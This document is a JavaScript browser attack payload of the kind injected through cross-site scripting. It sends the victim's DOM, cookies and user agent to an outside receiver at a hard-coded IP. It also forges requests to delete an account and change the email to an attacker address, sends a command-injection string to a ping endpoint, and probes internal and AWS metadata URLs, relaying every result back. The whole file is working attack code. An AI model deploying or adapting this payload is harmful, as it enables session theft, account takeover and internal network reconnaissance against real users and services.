// payloads___
//
//

(function () {
  const TARGET = "http://192.168.1.221:8080"; // ← Your receiver
  const ORIGIN = location.origin;

  function postData(encoded, path = "") {
    try {
      const xhr = new XMLHttpRequest();
      xhr.open("POST", `${TARGET}${path}`, true);
      xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
      xhr.send("data=" + encodeURIComponent(encoded));
    } catch (e) {}
  }

  function sendRaw(data, path = "") {
    postData(btoa(data), path);
  }

  // 1. DOM Preview
  sendRaw(document.documentElement.outerHTML.slice(0, 2048), "/dom");

  // 2. Cookie + Env
  sendRaw(document.cookie + " | " + navigator.userAgent, "/meta");

  // 3. Light CSRF (GET request with no response)
  try {
    const img = new Image();
    img.src = `${ORIGIN}/account/delete?id=1234`;
  } catch (_) {}

  // 4. CSRF via POST (auto-submit form technique)
  try {
    const f = document.createElement("form");
    f.method = "POST";
    f.action = `${ORIGIN}/account/change-email`;
    const i = document.createElement("input");
    i.name = "email";
    i.value = "admin@attacker.test";
    f.appendChild(i);
    document.body.appendChild(f);
    f.submit();
  } catch (_) {}

  // 5. Attempt light command injection via POST
  try {
    const payload = { host: "127.0.0.1; id" }; // benign command for testing
    const r = new XMLHttpRequest();
    r.open("POST", `${ORIGIN}/api/ping`, true);
    r.setRequestHeader("Content-Type", "application/json");
    r.onload = function () {
      sendRaw("cmd result: " + this.responseText, "/cmd");
    };
    r.onerror = function () {
      sendRaw("cmd request failed", "/cmd-error");
    };
    r.send(JSON.stringify(payload));
  } catch (_) {}

  // 6. SSRF to known local endpoint
  try {
    fetch(`${ORIGIN}/api/internal/config`)
      .then(r => r.text())
      .then(t => sendRaw("internal config: " + t.slice(0, 512), "/config"))
      .catch(() => {});
  } catch (_) {}

  // 7. Timing attack / delay profiling
  try {
    const t1 = performance.now();
    fetch(`${ORIGIN}/healthz?debug=1`).then(() => {
      const delta = performance.now() - t1;
      sendRaw("delta=" + delta.toFixed(2), "/timing");
    });
  } catch (_) {}

  // 8. Iframe force-load (possible CSRF)
  try {
    const i = document.createElement("iframe");
    i.style.display = "none";
    i.src = `${ORIGIN}/admin/refresh`;
    document.body.appendChild(i);
  } catch (_) {}

  // 9. Service list ping
  const internalHosts = [
    "http://localhost:8000/status",
    "http://127.0.0.1:5000/debug",
    "http://169.254.169.254/latest/meta-data/hostname", // AWS metadata
  ];

  internalHosts.forEach(url => {
    try {
      fetch(url)
        .then(r => r.text())
        .then(t => sendRaw("fetched " + url + ": " + t.slice(0, 128), "/ssrf"));
    } catch (_) {}
  });

  // 10. Beacon on error
  window.addEventListener("error", function (e) {
    sendRaw("client error: " + e.message, "/error");
  });

  // 11. Async blind POST trigger (for devops endpoints)
  try {
    fetch(`${ORIGIN}/api/refresh`, {
      method: "POST",
      headers: { "X-Trigger": "soft" },
    });
  } catch (_) {}

  // 12. Screenshot DOM section over time
  setTimeout(() => {
    try {
      const section = document.querySelector("main")?.outerHTML || "";
      sendRaw("delayed view: " + section.slice(0, 1024), "/deferred");
    } catch (_) {}
  }, 3000);

})();
//
//
